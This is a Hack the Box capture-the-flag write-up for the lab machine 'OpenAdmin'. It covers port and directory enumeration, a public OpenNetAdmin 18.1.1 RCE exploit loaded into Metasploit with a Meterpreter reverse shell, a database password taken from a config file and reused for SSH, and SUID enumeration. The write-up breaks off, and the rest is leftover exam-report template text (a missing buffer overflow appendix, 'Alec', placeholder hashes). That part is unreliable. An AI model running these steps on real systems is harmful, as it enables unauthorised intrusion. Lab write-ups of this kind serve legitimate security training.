---
title: "HTB: OpenAdmin"
author: ["Trae Horton", "https://sorsnce.com"]
date: "2020-01-14"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Writeup"
lang: "en"
titlepage: true
titlepage-color: "2d5c2a"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# Hack the Box: OpenAdmin

![OpenAdmin](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/OpenAdmin.jpg)

## Introduction

I thought this was a fun box, but kind of difficult for beginners. I never heard of OpenNetAdmin before this Hack the Box, but relized that this web service may contain more exploits that have not been reported. The box maker did a good job at guiding us to perform manual exploitating and giving us a nice simulation of how damaging this exploit could be.

## Objective

The objective of box is to simulate a real world use case of a software named: "OpenNetAdmin". If you google this software we will find the following description.

OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. A full CLI interface is available as well to use for scripting and bulk work. We hope to provide a useful Network Management application for managing your IP subnets, hosts and much more. Stop using spreadsheets to manage your network! Start doing proper IP address management!

## Requirements

The attacker will need the following software to exploit this box.

- NMAP
- Gobuster
- Metasploit
- GTFOBins
- Find


# Scanning/Enumeration

Target: `10.10.10.171`

```bash
root@kali:~$ sudo nmap -sS 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:09 EST
Nmap scan report for 10.10.10.171
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
root@kali:~$ 
```

Lets view what we can see on TCP Port 80:

![Apache](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/apache.png)

Now that we know there is a web server running on TCP port 80 lets perform a DirBuster:

```bash
root@kali:~/HTB/red-team$ sudo gobuster dir -u http://10.10.10.171 -w ~/HTB/red-team/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /home/traeh/HTB/red-team/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/19 20:16:02 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)

```

We immediately see a directory named "music", let's browse to that directory and see what we can find.

![Music](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/music.JPG)

We see a button within the dropdown menu that allows us to log into this site, lets click on that hyperlink and see what happens.

![ONA](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/ONA.JPG)

We can now see that this box is running something called OpenNetAdmin with a version of `18.1.1`. Lets perform a quick Google search to find out more infomatino about this product.

## OpenNetAdmin

We quickly see that there is an active (RCE) exploit for OpenNetAdmin version `18.1.1`. There appears to be two exploits available  within exploit-db, one appears to be a manual exploit via PHP and the other appears to use Metasploit. 

![Google-ONA](https://raw.githubusercontent.com/Sorsnce/red-team/master/HTB/Beta/Google.JPG)

Lets search our Metasploit instance to see if we have a copy of this RCE exploit.

```bash
root@kali:~/HTB/red-team/HTB/Beta# msfconsole
[-] ***rtinG the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

+ -- --=[ metasploit v5.0.62-dev                          ]
+ -- --=[ 1950 exploits - 1090 auxiliary - 334 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search OpenNetAdmin
[-] No results from search
msf5 >
```

It appears at the time of writing this report, this exploit is not in Metasploit's database by default. We can try updating the database but more than likely it will not pull the latest copy of this exploit. Let's manually add this exploit to our Metasploit instance by using the following code:

```bash
root@kali:~# wget https://www.exploit-db.com/raw/47772
--2020-01-21 15:11:24--  https://www.exploit-db.com/raw/47772
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com:443)... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3017 (2.9K) [text/plain]
Saving to: ‘47772’  
47772 100%[=================================================>] 2.95K
2020-01-21 15:11:24 (20.4 MB/s) - ‘47772’ saved [3017/3017]
root@kali:~# mkdir -p ~/.msf4/modules/exploits/custom
root@kali:~# mv 47772 ~/.msf4/modules/exploits/custom/ona.rb
```

# Exploiting

Now that we have the Metasploit exploit within our database lets attempt to run this exploit:

```bash
msf5 > use exploit/custom/ona
msf5 exploit(custom/ona) > set RHOST 10.10.10.171
RHOST => 10.10.10.171
msf5 exploit(custom/ona) > set TARGETURI /ona/
TARGETURL => /ona/
msf5 exploit(custom/ona) > set LHOST 10.10.10.10 #set to your VPN Address
LHOST => 10.10.10.10
msf5 exploit(custom/ona) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf5 exploit(custom/ona) > exploit

[*] Started reverse TCP handler on 10.10.10.10:4444
[*] Exploiting...
[*] Sending stage (3021284 bytes) to 10.10.10.171
[*] Meterpreter session 1 opened at 2020-01-21 15:52:49 +0100
[*] Command Stager progress - 100.12% done (809/808 bytes)

meterpreter >
```

Success! We have a Meterpreter session!

## www-data

Now that we have access to this box let's try to get the `user.txt` flag:

```bash
meterpreter > shell
Process 2625 created.
Channel 1 created.
whoami
www-data
ls /home
jimmy
joanna
cd jimmy
/bin/sh: 3: cd: can't cd to jimmy
cd joanna
/bin/sh: 4: cd: can't cd to joanna
```

Well, it looks like `www-data` does not have access to view the home directories for the `user.txt` flag.

# Privilege Escalation

So we know the user `www-data` does not have access to the `user.txt` flag, so lets try and see if we can use `jimmy` or `joanna` to pivot to their accounts:

```bash
ls

config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```

I spent a lot of time looking through these directories for anything interesting, I was trying to get a good understanding of what the source code was doing under the hood. I came across this directory that looked interesting.

```bash
pwd
/opt/ona/www/local
ls
config
nmap_scans
plugins
```
I was initially interested in the `nmap_scans` directory, but then relized that those nmap scan would not help me with a static HTB. I looked in the `config` directory to see if there was anything critical information within the configuration that might be vulnerable:

```bash
ls
database_settings.inc.php
motd.txt.example
run_installer
```
`database_setting.inc.php` looks interesting, lets print the content of that file and review it:

```bash
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```

We found a database password to the local mysqli instance, one thing to note in HTB, if you find a password try it on other accounts, I will attempt to ssh to `jimmy` and `joanne`'s account with this database password:

```bash
msf5 exploit(custom/ona) > ssh jimmy@10.10.10.171
[*] exec: ssh jimmy@10.10.10.171

jimmy@10.10.10.171's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 22 16:10:30 UTC 2020

  System load:  0.0               Processes:             110
  Usage of /:   49.0% of 7.81GB   Users logged in:       0
  Memory usage: 17%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```

Golden we are now `jimmy`

## Jimmy

Now that we have access to `jimmy`'s account lets see if we can print the `user.txt` flag.

```bash
jimmy@openadmin:~$ ls
jimmy@openadmin:~$ pwd
/home/jimmy
jimmy@openadmin:~$
```
Looks like the `user.txt` flag is not in `jimmy`'s home directory, let's look in `joanna`'s home folder.

```bash
jimmy@openadmin:~$ cd /home/joanna/
-bash: cd: /home/joanna/: Permission denied
jimmy@openadmin:~$
```

No luck, we either have to perform privilege escalation on `jimmy`'s account or try to get logged in via `joanna`'s account. Let's first try to escalate `jimmy`'s account:

```bash
jimmy@openadmin:~$ sudo -l
[sudo] password for jimmy:
Sorry, user jimmy may not run sudo on openadmin.
jimmy@openadmin:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/bin/ping
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
```

It does'nt appear we can eaily escalation `jimmy`'s account. Let's try looking to see what directories `jimmy` has access to via his account and group he is listed under.

```bash

```

**Proof Screenshot:**

**Completed Buffer Overflow Code:**

Please see Appendix 1 for the complete Windows Buffer Overflow code.

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, Alec removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.



# Additional Items

## Appendix - Proof and Local Contents:

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
